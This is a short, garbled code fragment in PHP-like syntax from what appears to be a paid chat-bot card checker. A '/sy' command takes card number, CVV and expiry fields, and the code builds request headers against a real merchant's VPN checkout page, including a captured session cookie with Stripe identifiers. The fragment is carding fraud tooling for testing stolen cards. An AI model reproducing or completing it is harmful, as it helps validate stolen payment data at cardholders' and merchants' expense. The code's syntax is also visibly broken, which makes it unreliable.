            ...
            foreach (paidUsers as index => line) :
                    ...
                    if (preg_match('/^(\/sy|\.sy|!sy)/', text)) :
                            ...
                            if (empty(cc) || empty(cvv) || empty(mes) || empty(ano)) :
                                ...
                                headers[] = 'accept-language: en-US,enq=0.7'
                                headers[] = 'content-type: application/x-www-form-urlencoded charset=UTF-8'
                                headers[] = 'origin: https:#www.thechinanewyear.com'
                                headers[] = 'referer: https:#www.thechinanewyear.com/buy-vpn/'
                                headers[] = 'Cookie: _gcl_au=1.1.1811202217.1703907246countdown-timer-exit=1704036847083_gid=GA1.2.2123170630.1703907247__user_id=uid-4136533092.6355064144_fbp=fb.1.1703907249790.1418301624__stripe_mid=1c73e41b-7de8-4247-8c09-32484b3531adad9865__stripe_sid=5c773394-7480-42a9-ac0e-d515c1427a2af9b77e_hjFirstSeen=1_hjIncludedInSessionSample_457749=1_hjSessionUser_457749=eyJpZCI6IjQ3ZDA2MDZlLTFmZTQtNWEwMi04MGQ3LTc4MzA3YzljNmZjMyIsImNyZWF0ZWQiOjE3MDM5MDcyNTQxOTksImV4aXN0aW5nIjp0cnVlfQ==_hjAbsoluteSessionInProgress=0_hjSession_457749=eyJpZCI6IjE3ZmYyNDFmLTFkNGMtNDdhMy1iNDY0LTJiMjNkOGYwMmY4ZCIsImMiOjE3MDM5MDcyNTQyMDUsInMiOjEsInIiOjEsInNiIjowfQ==gdprAgt=1_gat_UA-60343498-1=1_ga=GA1.1.1680700560.1703907247_ga_VG0S96L69Y=GS1.1.1703907247.1.1.1703908617.38.0.0_ga_JCYN1Y25S0=GS1.1.1703907246.1.1.1703908649.55.0.0'  
